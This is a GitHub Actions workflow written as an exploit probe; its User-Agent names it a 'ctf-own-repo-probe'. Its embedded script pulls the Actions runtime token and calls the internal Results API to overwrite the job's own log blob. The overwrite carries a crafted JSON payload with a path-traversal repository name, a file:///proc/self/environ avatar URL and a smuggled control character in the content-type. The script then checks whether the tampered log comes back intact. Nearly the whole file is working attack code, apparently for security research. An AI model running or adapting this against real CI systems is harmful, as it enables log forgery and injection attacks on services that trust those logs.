name: Probe job log metadata blob carrier
on:
  workflow_dispatch:
  push:
    branches: [main]
    paths:
      - .github/workflows/probe_job_log_metadata.yml
permissions:
  actions: read
  contents: read
jobs:
  carrier:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - uses: actions/github-script@v8
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
            const results = process.env.ACTIONS_RESULTS_URL;
            if (!runtime || !results) throw new Error('Actions Results runtime unavailable');
            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
            const scope = String(claims.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
            if (!scope) throw new Error('Actions.Results scope unavailable');
            const [, runId, jobId] = scope.split(':');
            const repo = process.env.GITHUB_REPOSITORY;
            const owner = repo.split('/')[0];
            const jobsResp = await fetch(`https://api.github.com/repos/${repo}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`, {headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json'}});
            if (!jobsResp.ok) throw new Error(`list jobs HTTP ${jobsResp.status}`);
            const jobs = (await jobsResp.json()).jobs;
            const job = jobs.find(x => String(x.id) === String(jobId)) || jobs[0];
            if (!job) throw new Error('job not found');
            const fullName = `x/../../repos/${repo}/actions/jobs/${job.id}/logs`;
            const payload = Buffer.from(JSON.stringify({full_name: fullName, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'job-log metadata test', stargazers_count: 1}));
            async function rpc(method, data) {
              const response = await fetch(new URL(`twirp/results.services.receiver.Receiver/${method}`, results), {method: 'POST', headers: {Authorization: `Bearer ${runtime}`, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
              const text = await response.text();
              if (!response.ok) throw new Error(`${method} HTTP ${response.status}: ${text.slice(0,160)}`);
              return JSON.parse(text);
            }
            const fields = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
            const signed = await rpc('GetJobLogsSignedBlobURL', fields);
            const put = await fetch(signed.logs_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json\u0085', 'x-ms-version': '2023-11-03', 'If-None-Match': '*', 'Content-Type': 'application/octet-stream'}, body: payload});
            const putStatus = put.status;
            await put.arrayBuffer();
            let metadata = null;
            if (put.ok) {
              metadata = await rpc('CreateJobLogsMetadata', {...fields, uploaded_at: new Date().toISOString(), line_count: 1});
            }
            console.log(`UPLOAD status=${putStatus} metadata_ok=${Boolean(metadata?.ok)} payload_bytes=${payload.length}`);
            const apiHeaders = {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json', 'User-Agent': 'ctf-own-repo-probe'};
            const response = await fetch(`https://api.github.com/repos/${repo}/actions/jobs/${job.id}/logs`, {headers: apiHeaders, redirect: 'manual'});
            console.log(`LOG_API status=${response.status} type=${JSON.stringify(response.headers.get('content-type') || '')} location=${Boolean(response.headers.get('location'))}`);
            let final = response;
            if (response.status >= 300 && response.status < 400 && response.headers.get('location')) {
              final = await fetch(response.headers.get('location'));
            }
            const raw = Buffer.from(await final.arrayBuffer());
            const type = final.headers.get('content-type') || '';
            let isJson = false;
            try { JSON.parse(raw.toString('utf8')); isJson = true; } catch {}
            console.log(`LOG_RAW status=${final.status} type=${JSON.stringify(type)} typeHex=${Buffer.from(type).toString('hex')} bytes=${raw.length} exact=${raw.equals(payload)} json=${isJson} sha256=${require('node:crypto').createHash('sha256').update(raw).digest('hex')}`);


